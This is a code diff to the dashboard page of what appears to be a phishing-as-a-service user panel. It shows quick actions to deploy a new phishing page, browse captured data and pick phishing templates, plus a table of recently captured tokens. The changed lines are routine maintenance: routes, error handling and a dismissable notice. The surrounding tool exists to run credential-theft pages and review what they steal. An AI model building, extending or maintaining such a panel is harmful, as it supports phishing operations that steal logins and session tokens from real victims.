@@ -85,24 +85,24 @@
             <span class="section-title">Quick Actions</span>
         </div>
         <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:28px;">
-            <a href="links.html" class="quick-action-card">
+            <a href="/user-panel/links" class="quick-action-card">
                 <div class="quick-action-icon"><i class="fas fa-plus"></i></div>
-                <div><div class="quick-action-label">Create Link</div><div class="quick-action-desc">Deploy a new page</div></div>
+                <div><div class="quick-action-label">Create Link</div><div class="quick-action-desc">Deploy a new phishing page</div></div>
             </a>
-            <a href="tokens.html" class="quick-action-card">
+            <a href="/user-panel/tokens" class="quick-action-card">
                 <div class="quick-action-icon"><i class="fas fa-key"></i></div>
                 <div><div class="quick-action-label">View Tokens</div><div class="quick-action-desc">Browse captured data</div></div>
             </a>
-            <a href="templates.html" class="quick-action-card">
+            <a href="/user-panel/templates" class="quick-action-card">
                 <div class="quick-action-icon"><i class="fas fa-file-code"></i></div>
-                <div><div class="quick-action-label">Templates</div><div class="quick-action-desc">Available Templates</div></div>
+                <div><div class="quick-action-label">Templates</div><div class="quick-action-desc">12 templates available</div></div>
             </a>
         </div>
 
         <!-- Recent Tokens -->
         <div class="section-header">
             <span class="section-title">Recent Tokens</span>
-            <a href="tokens.html" style="font-size:12px;color:var(--accent);font-weight:500;">View all <i class="fas fa-arrow-right" style="font-size:10px;"></i></a>
+            <a href="/user-panel/tokens" style="font-size:12px;color:var(--accent);font-weight:500;">View all <i class="fas fa-arrow-right" style="font-size:10px;"></i></a>
         </div>
         <div class="card" style="overflow:hidden;">
             <table class="tokens-table">
@@ -117,7 +117,7 @@
     <script src="assets/js/user.js"></script>
     <script>
         const token = getToken();
-        if (!token) window.location.href = '/user-panel/index.html';
+        if (!token) window.location.href = '/user-panel';
 
         // Init shared components
         initShared('dashboard');
@@ -131,7 +131,14 @@
                     fetch(`${API}/tokens?limit=5`, { headers: authHeaders() }),
                 ]);
                 
-                const profile = await profileRes.json();
+                let profile = {};
+                if (profileRes.ok) {
+                    profile = await profileRes.json();
+                } else {
+                    try { const err = await profileRes.json(); console.error('Profile load failed', err); } catch (e) {}
+                    profile = {};
+                    showToast('Failed to load profile', true);
+                }
                 const dash = await dashRes.json();
                 const tokensData = await tokensRes.json();
 
@@ -193,15 +200,27 @@
             }
         }
 
-        // Load notices
+        // Load notices (shows dismiss button)
         async function loadNotices() {
             try {
-                const res = await fetch(`${API}/notices/latest`);
+                const res = await fetch(`${API}/notices/latest`, { headers: authHeaders() });
+                if (!res.ok) return; // no auth or unavailable
                 const notice = await res.json();
-                if (notice && notice.active) {
-                    document.getElementById('noticeContent').textContent = notice.content || notice.title;
-                    document.getElementById('noticeBoard').style.display = 'block';
-                }
+                if (!notice || !notice.active) return;
+                // Respect client-side dismissal
+                try { if (localStorage.getItem('dismiss_notice_' + notice.id)) return; } catch (e) {}
+                const contentEl = document.getElementById('noticeContent');
+                contentEl.innerHTML = '';
+                const p = document.createElement('div'); p.textContent = notice.content || notice.title || '';
+                const btn = document.createElement('button'); btn.className = 'btn-sm'; btn.style.float = 'right'; btn.textContent = 'Dismiss';
+                btn.onclick = async () => {
+                    document.getElementById('noticeBoard').style.display = 'none';
+                    try { await fetch(`${API}/user/notices/dismiss`, { method: 'POST', headers: authHeaders(), body: JSON.stringify({ notice_id: notice.id }) }); } catch (e) {}
+                    try { localStorage.setItem('dismiss_notice_' + notice.id, '1'); } catch (e) {}
+                };
+                contentEl.appendChild(btn);
+                contentEl.appendChild(p);
+                document.getElementById('noticeBoard').style.display = 'block';
             } catch (e) {}
         }
 
@@ -228,7 +247,7 @@
                 const payload = JSON.parse(atob(token.split('.')[1]));
                 if (payload.exp * 1000 < Date.now()) {
                     localStorage.removeItem('vg-token');
-                    window.location.href = '/user-panel/index.html';
+                    window.location.href = '/user-panel';
                 }
             } catch (e) {}
         }
